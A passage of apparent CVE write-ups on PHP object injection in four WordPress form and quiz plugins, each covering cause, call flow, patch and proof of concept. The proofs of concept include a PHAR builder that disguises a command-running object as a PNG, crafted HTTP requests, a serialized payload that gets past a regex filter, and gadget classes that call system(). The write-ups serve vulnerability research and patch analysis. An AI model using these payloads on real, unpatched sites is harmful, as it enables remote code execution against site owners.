--\u003e D[\"handle_entry_actions\"] D --\u003e E[\"Entries_List_Table::handle_entry_status()\"] E -- $action=delete --\u003e F[\"Entries_List_Table::delete_entry_files()\"] F --\u003e G{\"$value is array\"} G -- Yes --\u003e H[\"call file_exists( $file_path )\"] --\u003e L[\"RCE: PHAR Deserialization\"] G -- No --\u003e K[\"continue\"] graph TD A[\"Client submit form\"] --\u003e B[\"Admin delete entry\"] B --\u003e C[\"WordPress hook: admin_init\"] C --\u003e D[\"handle_entry_actions\"] D --\u003e E[\"Entries_List_Table::handle_entry_status()\"] E -- $action=delete --\u003e F[\"Entries_List_Table::delete_entry_files()\"] F --\u003e G{\"$value is array\"} G -- Yes --\u003e H[\"call file_exists( $file_path )\"] --\u003e L[\"RCE: PHAR Deserialization\"] G -- No --\u003e K[\"continue\"] graph TD A[\"Client submit form\"] --\u003e B[\"Admin delete entry\"] B --\u003e C[\"WordPress hook: admin_init\"] C --\u003e D[\"handle_entry_actions\"] D --\u003e E[\"Entries_List_Table::handle_entry_status()\"] E -- $action=delete --\u003e F[\"Entries_List_Table::delete_entry_files()\"] F --\u003e G{\"$value is array\"} G -- Yes --\u003e H[\"call file_exists( $file_path )\"] --\u003e L[\"RCE: PHAR Deserialization\"] G -- No --\u003e K[\"continue\"] ","date":"2025-11-19","objectID":"/posts/2025-11-19-cve-2025-6742/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/posts/2025-11-19-cve-2025-6742/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Use an admin account to create a form and insert it into a post Create a PHP file create_phar.php with the following code: \u003c?php // Define class Evil with a property and __wakeup function class Evil { // Property command contains the system command to be executed public $command = \"ls /\"; // __wakeup() is triggered when this object is unserialized public function __wakeup(): void { // When unserialized, execute the command in $command and terminate program die(system($this-\u003ecommand)); } } // Create a new PHAR file named poc.phar $phar = new Phar('poc.phar'); // Begin writing PHAR contents $phar-\u003estartBuffering(); // Add a fake entry named test.png with content \"text\" $phar-\u003eaddFromString('test.png', 'text'); // Set PHAR stub beginning with PNG magic bytes to disguise it as an image, // then __HALT_COMPILER() to end execution $phar-\u003esetStub(\"\\x89PNG\\r\\n\\x1a\\n\u003c?php __HALT_COMPILER(); ?\u003e\"); // Write metadata containing an Evil object $phar-\u003esetMetadata(new Evil()); // Finish writing and flush to file $phar-\u003estopBuffering(); Create the PHAR file poc.phar by running: php --define phar.readonly=0 create_phar.php Info phar.readonly is a directive in PHP (Phar extension configuration). By default its value is 1 (readonly) and PHAR files cannot be created. To generate PHAR files, disable readonly using phar.readonly=0 or configure it in php.ini. Rename poc.phar to poc.png since file uploads typically only accept images rather than .phar Upload poc.jpg using the Media Editor. Take note of its upload path in wp-content/uploads. Resend the form submission request: Request POST /wp-json/sureforms/v1/submit-form?_locale=user HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0 Accept: application/json, */*;q=0.1 Accept-Language: en-US,en;q=0.7,vi;q=0.3 Accept-Encoding: gzip, deflate, br Referer: http://localhost/2025/11/19/form-testing/ X-WP-Nonce: 2c506366a5 Content-Type: multipart/form-data; boundary=----geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Length: 775 Origin: http://localhost Connection: keep-alive Cookie: wp-settings-time-3=1763365761 Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: same-origin X-PwnFox-Color: blue Priority: u=0 ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"sureforms_form_submit\" d3b9273370 ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"_wp_http_referer\" /2025/11/19/form-testing/ ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"form-id\" 123 ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"srfm-sender-email-field\" ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221 Content-Disposition: form-data; name=\"srfm-input-7469d29b-lbl-VGV4dCBGaWVsZA-text-field[]\" phar://../wp-content/uploads/2025/11/poc.png ------geckoformboundary951e0587d59c442ebcc7cae9dcac2221-- When the admin deletes the entry RCE when admin deletes entry Warning After testing multiple PHP versions, I found that: The function file_exists() only works for PHAR exploitation on versions \u003c=7.4 Some other functions usable for PHAR Deserialization exploitation: copy file_exists file_get_contents file_put_contents file fileatime filectime filegroup fileinode filemtime fileowner fileperms filesize filetype fopen is_dir is_executable is_file is_link is_readable is_writable lstat mkdir parse_ini_file readfile rename rmdir stat touch unlink ","date":"2025-11-19","objectID":"/posts/2025-11-19-cve-2025-6742/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/posts/2025-11-19-cve-2025-6742/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The PHP Object Injection vulnerability in SureForm \u003c= 1.7.3 originates from using file_exists() and unlink() directly on a user-controlled path without scope constraints. Although the plugin does not contain a POP chain by default, if additional plugins or themes installed in the environment contain a POP chain, attackers may escalate exploitation to deleting files, reading sensitive data, or even executing arbitrary code (RCE). The 1.7.4 patch handles the issue by normalizing and restricting valid file paths into the upload directory, eliminating the exploitation vector. ","date":"2025-11-19","objectID":"/posts/2025-11-19-cve-2025-6742/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/posts/2025-11-19-cve-2025-6742/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways The vulnerability originates from interacting with filesystem paths derived directly from uncontrolled user input. Using only file_exists() can lead to PHAR deserialization on PHP versions ≤7.4. Although the plugin has no built-in POP chain, typical WordPress environments host many plugins → high likelihood of chainability. The patch adds path normalization, upload directory restrictions, and avoids directly interacting with filesystem paths. File operation functions always pose exploitation risk if user inputs are not strongly validated. ","date":"2025-11-19","objectID":"/posts/2025-11-19-cve-2025-6742/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/posts/2025-11-19-cve-2025-6742/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Deserialization WordPress SureForm Plugin \u003c= 1.7.3 is vulnerable to a high priority PHP Object Injection ","date":"2025-11-19","objectID":"/posts/2025-11-19-cve-2025-6742/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-6742 Analysis \u0026 POC","uri":"/posts/2025-11-19-cve-2025-6742/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress WP Easy Contact Plugin.","date":"2025-11-18","objectID":"/posts/2025-11-18-cve-2025-53572/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-18-cve-2025-53572/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info The Deserialization of Untrusted Data vulnerability in emarket-design WP Easy Contact allows Object Injection. This issue affects WP Easy Contact: from n/a to 4.0.1. CVE ID: CVE-2025-53572 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 4.0.1 Patched Versions: 4.0.2 CVSS severity: High (8.1) Required Privilege: Unauthenticated Product: WordPress WP Easy Contact Plugin ","date":"2025-11-18","objectID":"/posts/2025-11-18-cve-2025-53572/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-18-cve-2025-53572/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – WP Easy Contact 4.0.1 – vulnerable 4.0.2 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-18","objectID":"/posts/2025-11-18-cve-2025-53572/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-18-cve-2025-53572/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause The vulnerability originates from allowing attackers to instantiate arbitrary objects from input → PHP Object Injection. widget-functions.php v4.0.1 $widg_arr = explode(\"-\", $div_id); $mywidg = new $widg_arr[1](); The patch adds a whitelist and sanitizes the input → only valid classes can be instantiated, removing the vulnerability. Changes in the patch ","date":"2025-11-18","objectID":"/posts/2025-11-18-cve-2025-53572/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-18-cve-2025-53572/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis The plugin registers an Ajax action for unauthenticated users (wp_ajax_nopriv): add_action('wp_ajax_nopriv_emd_get_widg_pagenum', 'emd_get_widg_pagenum'); When a request is sent to /wp-admin/admin-ajax.php with action=emd_get_widg_pagenum, the callback emd_get_widg_pagenum is executed: widget-functions.php v4.0.1 function emd_get_widg_pagenum(){ $response = false; $pageno = isset($_GET['pageno']) ? (int) $_GET['pageno'] : 1; $div_id = isset($_GET['div_id']) ? sanitize_text_field($_GET['div_id']) : ''; $myapp = isset($_GET['app']) ? sanitize_text_field($_GET['app']) : ''; if(!empty($div_id)){ $pids = Array(); $front_ents = emd_find_limitby('frontend', $myapp); $widg_arr = explode(\"-\",$div_id); $mywidg = new $widg_arr[1](); ... } } For the line new $widg_arr[1]() to run, the condition if(!empty($div_id)) must be satisfied, meaning the GET parameter div_id has to be provided. $widg_arr[1] is taken from the array obtained after explode on the value of $_GET['div_id']. For example, if div_id=abc-Class, then $widg_arr[1] equals Class, allowing arbitrary object instantiation through new $widg_arr[1](). ","date":"2025-11-18","objectID":"/posts/2025-11-18-cve-2025-53572/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-18-cve-2025-53572/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum\u0026div_id=abc-Class\"] --\u003e B[\"WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum\"] B --\u003e C[\"Callback: emd_get_widg_pagenum()\"] C --\u003e D{\"Check if div_id is not empty\"} D -- True --\u003e E[\"explode('-', div_id) → $widg_arr\"] E --\u003e F[\"Instantiate object: new $widg_arr[1]()\"] graph TD A[\"Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum\u0026div_id=abc-Class\"] --\u003e B[\"WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum\"] B --\u003e C[\"Callback: emd_get_widg_pagenum()\"] C --\u003e D{\"Check if div_id is not empty\"} D -- True --\u003e E[\"explode('-', div_id) → $widg_arr\"] E --\u003e F[\"Instantiate object: new $widg_arr[1]()\"] graph TD A[\"Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum\u0026div_id=abc-Class\"] --\u003e B[\"WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum\"] B --\u003e C[\"Callback: emd_get_widg_pagenum()\"] C --\u003e D{\"Check if div_id is not empty\"} D -- True --\u003e E[\"explode('-', div_id) → $widg_arr\"] E --\u003e F[\"Instantiate object: new $widg_arr[1]()\"] graph TD A[\"Client sends GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum\u0026div_id=abc-Class\"] --\u003e B[\"WordPress hook: wp_ajax_nopriv_emd_get_widg_pagenum\"] B --\u003e C[\"Callback: emd_get_widg_pagenum()\"] C --\u003e D{\"Check if div_id is not empty\"} D -- True --\u003e E[\"explode('-', div_id) → $widg_arr\"] E --\u003e F[\"Instantiate object: new $widg_arr[1]()\"] ","date":"2025-11-18","objectID":"/posts/2025-11-18-cve-2025-53572/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-18-cve-2025-53572/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Create a test class inside wp-config.php: class ObjectInjection { public $command; public function __construct(){ $this-\u003ecommand = $_GET['cmd']; } function __destruct(){ die(system($this-\u003ecommand)); } } Send the request with payload: GET /wp-admin/admin-ajax.php?action=emd_get_widg_pagenum\u0026div_id=abc-ObjectInjection\u0026cmd=ls+/ Result ","date":"2025-11-18","objectID":"/posts/2025-11-18-cve-2025-53572/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-18-cve-2025-53572/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The vulnerability in WP Easy Contact \u003c= 4.0.1 stems from unsafe input handling, allowing direct object instantiation from user-controlled data. By abusing the div_id parameter, attackers can achieve PHP Object Injection leading to arbitrary code execution. The patch in 4.0.2 fixes the issue by introducing a whitelist and sanitizing input, ensuring only valid classes can be instantiated. This clearly demonstrates how unsafe deserialization can become a critical exploit vector, especially when combined with unauthenticated access. ","date":"2025-11-18","objectID":"/posts/2025-11-18-cve-2025-53572/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-18-cve-2025-53572/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways Unauthenticated attack surface: Triggered via wp_ajax_nopriv, no login required. Root cause: Directly using user input (new $widg_arr[1]()), no validation. Fix strategy: Apply whitelist and sanitize to restrict valid classes. Best practice: Always validate and sanitize input, avoid unsafe deserialization, and restrict object instantiation from untrusted sources. ","date":"2025-11-18","objectID":"/posts/2025-11-18-cve-2025-53572/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-18-cve-2025-53572/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Deserialization WordPress WP Easy Contact Plugin \u003c= 4.0.1 is vulnerable to a high priority PHP Object Injection ","date":"2025-11-18","objectID":"/posts/2025-11-18-cve-2025-53572/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-53572 Analysis \u0026 POC","uri":"/posts/2025-11-18-cve-2025-53572/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Quiz And Survey Master Plugin.","date":"2025-11-17","objectID":"/posts/2025-11-17-cve-2025-49401/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/posts/2025-11-17-cve-2025-49401/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info This plugin performs unserialize on user-supplied data through a form field, which may allow unauthenticated users to perform PHP Object Injection if a suitable gadget exists in the system. CVE ID: CVE-2025-49401 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 10.2.5 Patched Versions: 10.2.6 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Quiz And Survey Master Plugin ","date":"2025-11-17","objectID":"/posts/2025-11-17-cve-2025-49401/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/posts/2025-11-17-cve-2025-49401/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – Quiz And Survey Master: 10.2.5 – vulnerable 10.2.6 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-17","objectID":"/posts/2025-11-17-cve-2025-49401/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/posts/2025-11-17-cve-2025-49401/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause The vulnerability originates from the use of maybe_unserialize(). Although some checks exist, this mechanism is still not fully secure. template-variables.php if ( preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids ) ) { return ''; } if ( is_serialized( $qmn_sanitize_random_ids ) ) { $unserialized = maybe_unserialize( $qmn_sanitize_random_ids ); if ( ! is_object( $unserialized ) \u0026\u0026 ! is_resource( $unserialized ) ) { return $unserialized; } } The patch replaces maybe_unserialize() with unserialize() and blocks all object creation using ['allowed_classes' =\u003e false] → effectively preventing PHP Object Injection. Patch changes ","date":"2025-11-17","objectID":"/posts/2025-11-17-cve-2025-49401/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/posts/2025-11-17-cve-2025-49401/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis After reviewing the logic of qsm_questions_answers_shortcode_to_text(), I noticed repeated appearances of keywords like question and answer, indicating this function is likely directly tied to question/answer processing. Instead of tracing step-by-step, I decided to search for related functions dealing with question and answer, while debugging inside qsm_questions_answers_shortcode_to_text(). If this method didn’t work, I would perform a deeper trace. After some digging, I created a post with a custom question. Creating quiz with the plugin block Access the post and submit an answer. Debugger at qsm_questions_answers_shortcode_to_text The debugger stopped at qsm_questions_answers_shortcode_to_text(). Current request: POST /wp-admin/admin-ajax.php HTTP/1.1 ... The function qmn_sanitize_random_ids_data() will call maybe_unserialize(). But first, this condition must be met: if ( ! empty( $_POST['quiz_answer_random_ids'] ) ) We can edit one of the fields in the request and replace it with quiz_answer_random_ids. - Content-Disposition: form-data; name=\"currentuserTimeZone\" - Asia/Bangkok + Content-Disposition: form-data; name=\"quiz_answer_random_ids\" + payload The value of qmn_sanitize_random_ids will be the input passed to maybe_unserialize(). ![Debug](Value of qmn_sanitize_random_ids) template-variables.php function qmn_sanitize_random_ids_data( $qmn_sanitize_random_ids ) { if ( is_string( $qmn_sanitize_random_ids ) ) { if ( preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids ) ) { return ''; } if ( is_serialized( $qmn_sanitize_random_ids ) ) { $unserialized = maybe_unserialize( $qmn_sanitize_random_ids ); if ( ! is_object( $unserialized ) \u0026\u0026 ! is_resource( $unserialized ) ) { return $unserialized; } } } return $qmn_sanitize_random_ids; } Before maybe_unserialize is invoked, we need to bypass the only filter: if ( preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids ) ) { return ''; } The regex checks whether the string begins with O: or C:. For example: O:8:\"stdClass\":... Unfortunately, the defense is weak. Serialized payloads can begin with a: (array), and arrays may contain O: or C: to trigger object deserialization. The plugin registers an AJAX endpoint for unauthenticated users (nopriv): class-qmn-quiz-manager.php add_action( 'wp_ajax_nopriv_qmn_process_quiz', array( $this, 'ajax_submit_results' ) ); When a request hits /wp-admin/admin-ajax.php with action=qmn_process_quiz, the callback ajax_submit_results() is executed. It then calls submit_results(), JSON-encodes the output, and echoes it. class-qmn-quiz-manager.php echo wp_json_encode( $this-\u003esubmit_results( $options, $data ) ); submit_results() calls display_results_text(). class-qmn-quiz-manager.php $results_pages = $this-\u003edisplay_results_text( $qmn_quiz_options, $qmn_array_for_variables ); display_results_text() calls generate_pages(). class-qsm-results-pages.php return QSM_Results_Pages::generate_pages( $response_data ); generate_pages() applies the filter previously registered: mlw_qmn_template_variable_results_page. class-qsm-results-pages.php echo apply_filters( 'mlw_qmn_template_variable_results_page', $page, $response_data ); Many callbacks registered Many callbacks are registered for this filter, but the relevant one here is mlw_qmn_variable_question_answers, which directly triggers the function qsm_questions_answers_shortcode_to_text() analyzed earlier. ","date":"2025-11-17","objectID":"/posts/2025-11-17-cve-2025-49401/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/posts/2025-11-17-cve-2025-49401/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"POST /wp-admin/admin-ajax.php\"] -- action=qmn_process_quiz\u0026other_post_data --\u003e B[\"wp_ajax_nopriv_qmn_process_quiz\"] B --\u003e C[\"ajax_submit_results()\"] C --\u003e D[\"submit_results()\"] D --\u003e E[\"display_results_text()\"] E --\u003e F[\"generate_pages()\"] F -- apply filter mlw_qmn_template_variable_results_page --\u003e G[\"mlw_qmn_variable_question_answers()\"] G --\u003e H[\"qsm_questions_answers_shortcode_to_text()\"] H --\u003e K{\" ! empty( $_POST['quiz_answer_random_ids'] )\"} K -- true --\u003e L[\"qmn_sanitize_random_ids_data()\"] --\u003e M{\"preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids )\"} M -- true --\u003e N[\"return ''\"] M -- false --\u003e V[\"maybe_unserialize\"] --\u003e W[\"RCE\"] graph TD A[\"POST /wp-admin/admin-ajax.php\"] -- action=qmn_process_quiz\u0026other_post_data --\u003e B[\"wp_ajax_nopriv_qmn_process_quiz\"] B --\u003e C[\"ajax_submit_results()\"] C --\u003e D[\"submit_results()\"] D --\u003e E[\"display_results_text()\"] E --\u003e F[\"generate_pages()\"] F -- apply filter mlw_qmn_template_variable_results_page --\u003e G[\"mlw_qmn_variable_question_answers()\"] G --\u003e H[\"qsm_questions_answers_shortcode_to_text()\"] H --\u003e K{\" ! empty( $_POST['quiz_answer_random_ids'] )\"} K -- true --\u003e L[\"qmn_sanitize_random_ids_data()\"] --\u003e M{\"preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids )\"} M -- true --\u003e N[\"return ''\"] M -- false --\u003e V[\"maybe_unserialize\"] --\u003e W[\"RCE\"] graph TD A[\"POST /wp-admin/admin-ajax.php\"] -- action=qmn_process_quiz\u0026other_post_data --\u003e B[\"wp_ajax_nopriv_qmn_process_quiz\"] B --\u003e C[\"ajax_submit_results()\"] C --\u003e D[\"submit_results()\"] D --\u003e E[\"display_results_text()\"] E --\u003e F[\"generate_pages()\"] F -- apply filter mlw_qmn_template_variable_results_page --\u003e G[\"mlw_qmn_variable_question_answers()\"] G --\u003e H[\"qsm_questions_answers_shortcode_to_text()\"] H --\u003e K{\" ! empty( $_POST['quiz_answer_random_ids'] )\"} K -- true --\u003e L[\"qmn_sanitize_random_ids_data()\"] --\u003e M{\"preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids )\"} M -- true --\u003e N[\"return ''\"] M -- false --\u003e V[\"maybe_unserialize\"] --\u003e W[\"RCE\"] graph TD A[\"POST /wp-admin/admin-ajax.php\"] -- action=qmn_process_quiz\u0026other_post_data --\u003e B[\"wp_ajax_nopriv_qmn_process_quiz\"] B --\u003e C[\"ajax_submit_results()\"] C --\u003e D[\"submit_results()\"] D --\u003e E[\"display_results_text()\"] E --\u003e F[\"generate_pages()\"] F -- apply filter mlw_qmn_template_variable_results_page --\u003e G[\"mlw_qmn_variable_question_answers()\"] G --\u003e H[\"qsm_questions_answers_shortcode_to_text()\"] H --\u003e K{\" ! empty( $_POST['quiz_answer_random_ids'] )\"} K -- true --\u003e L[\"qmn_sanitize_random_ids_data()\"] --\u003e M{\"preg_match( '/^(O|C):\\d+:/', $qmn_sanitize_random_ids )\"} M -- true --\u003e N[\"return ''\"] M -- false --\u003e V[\"maybe_unserialize\"] --\u003e W[\"RCE\"] ","date":"2025-11-17","objectID":"/posts/2025-11-17-cve-2025-49401/:5:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/posts/2025-11-17-cve-2025-49401/#flow"},{"categories":["CVE Analysis"],"collections":null,"content":"Proof of Concept (PoC) Use the plugin to create a post with a quiz using the QSM block. Submit the form and intercept the request via Burp. Modify the value of quiz_answer_random_ids to contain the serialized payload: a:1:{i:0;O:15:\"ObjectInjection\":1:{s:7:\"command\";s:4:\"ls /\";}} Resend the request. Tip To test locally, create a class with a magic method __wakeup() or __destruct() in wp-config.php: class ObjectInjection { public $command; function __destruct(){ die(system($this-\u003ecommand)); } } ","date":"2025-11-17","objectID":"/posts/2025-11-17-cve-2025-49401/:6:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/posts/2025-11-17-cve-2025-49401/#proof-of-concept-poc"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion The CVE-2025-49401 vulnerability is caused by unsafe input handling through maybe_unserialize(), allowing unauthenticated attackers to provide serialized payloads to trigger PHP Object Injection. The filtering based on preg_match only blocks payloads beginning with O: or C: but fails against serialized arrays containing objects. Combined with an open AJAX endpoint (wp_ajax_nopriv_qmn_process_quiz), the payload moves through several layers before being unserialized, ultimately enabling arbitrary code execution (RCE) if a suitable gadget chain exists. The patch uses unserialize(..., ['allowed_classes' =\u003e false]), completely eliminating object creation and fully mitigating the vulnerability. ","date":"2025-11-17","objectID":"/posts/2025-11-17-cve-2025-49401/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/posts/2025-11-17-cve-2025-49401/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"Key Takeaways maybe_unserialize() is inherently dangerous when handling user input in WordPress. Manual regex filtering is insufficient to stop deserialization attacks — attackers can wrap malicious objects inside arrays. Unauthenticated AJAX endpoints are highly sensitive attack surfaces. allowed_classes = false is the safest mitigation when object deserialization is not needed. The more complex the plugin, the higher the chance of gadget chains leading to RCE. ","date":"2025-11-17","objectID":"/posts/2025-11-17-cve-2025-49401/:0:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/posts/2025-11-17-cve-2025-49401/#key-takeaways"},{"categories":["CVE Analysis"],"collections":null,"content":"References Deserialization WordPress Quiz And Survey Master Plugin \u003c= 10.2.5 is vulnerable to a high priority PHP Object Injection ","date":"2025-11-17","objectID":"/posts/2025-11-17-cve-2025-49401/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-49401 Analysis \u0026 POC","uri":"/posts/2025-11-17-cve-2025-49401/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Ninja Forms Plugin.","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/"},{"categories":["CVE Analysis"],"collections":null,"content":"CVE \u0026 Basic Info This plugin performs an unserialize operation on data submitted by users through form fields. This allows unauthenticated users to perform PHP Object Injection if a suitable gadget exists within the system. CVE ID: CVE-2025-9083 Vulnerability Type: PHP Object Injection Affected Versions: \u003c= 3.11.0 Patched Versions: 3.11.1 CVSS severity: High (9.8) Required Privilege: Unauthenticated Product: WordPress Ninja Forms Plugin ","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/:1:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/#cve--basic-info"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements Local WordPress \u0026 Debugging Virtual Machine Docker Plugin Version – Ninja Forms: 3.11.0 – vulnerable 3.11.1 – patched Diff Tool (diff) → Meld or any diff tool. ","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/:2:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Cause The vulnerability originates from the extractSubmissions() function inside the FieldsetRepeater.php file: if(is_string($fieldSubmissionValue)){ $fieldSubmissionValue = maybe_unserialize($fieldSubmissionValue); } maybe_unserialize() is called without any protection against PHP Object Injection. Bug and patch The patch replaces maybe_unserialize() with unserialize() and disables object creation using ['allowed_classes' =\u003e false], preventing PHP Object Injection altogether. ","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/:3:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/#cause"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis Class name The class name corresponds to a layout field when creating a blank form with the plugin. Create form with Repeatable Fieldset Create a form with Repeatable Fieldset, then drag a Single Line Text field into it as input, and embed the form into a post or page. Embed form into post Publish the post and submit the form with a payload value: Request test with `payload` We see that all data is assigned to the formData parameter. Copy the URL-decoded content into an online JSON formatter: https://jsonformatter.org/ Formatted JSON data Observing the debugger shows the similarity: Debugger data $fieldSubmissionValue corresponds to the value of the field with ID 8. Thus, when value is a string, it triggers maybe_unserialize(). We create a class and place it in wp-config.php to test the invocation when maybe_unserialize() runs: class ObjectInjection { public $command; function __destruct(){ die(system($this-\u003ecommand)); } } Resubmit the request with a serialized payload as the new value. Because the payload is wrapped inside JSON, quotes must be escaped (\\\") to avoid breaking the JSON structure. Change the value to serialized string Value inside debugger Shell execution occurs → Deserialization is triggered. Deserialization triggered Callstack flow: The application registers an AJAX handler for unauthenticated users: if( isset( $_POST['formData'] ) ) { $this-\u003e_form_data = json_decode( $_POST['formData'], TRUE ); // php5.2 fallback if( ! $this-\u003e_form_data ) $this-\u003e_form_data = json_decode( stripslashes( $_POST['formData'] ), TRUE ); } add_action( 'wp_ajax_nopriv_nf_ajax_submit', array( $this, 'submit' ) ); This means when sending a POST request to /wp-admin/admin-ajax.php with action=nf_ajax_submit, the submit callback is triggered. A fully submitted form follows this call flow: Callstack diagram ","date":"2025-11-14","objectID":"/posts/2025-11-14-cve-2025-9083/:4:0","tags":["analyst","plugin","php object injection"],"title":"CVE-2025-9083 Analysis \u0026 POC","uri":"/posts/2025-11-14-cve-2025-9083/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Flow graph TD A[\"POST /wp-admin/admin-ajax.php\"] -- action=nf_ajax_submit\u0026security=security_code\u0026formData=form_data --\u003e B[\"wp_ajax_nopriv_nf_ajax_submit\"] B --\u003e C[\"NF_AJAX_Controllers_Submission::submit()\"] C --\u003e D[\"NF_AJAX_Controllers_Submission::process()\"] D --\u003e E[\"NF_MergeTags_Fields::add_field()\"] E --\u003e F[\"NF_MergeTags_Fields::generateFieldsetTableRows()\"] 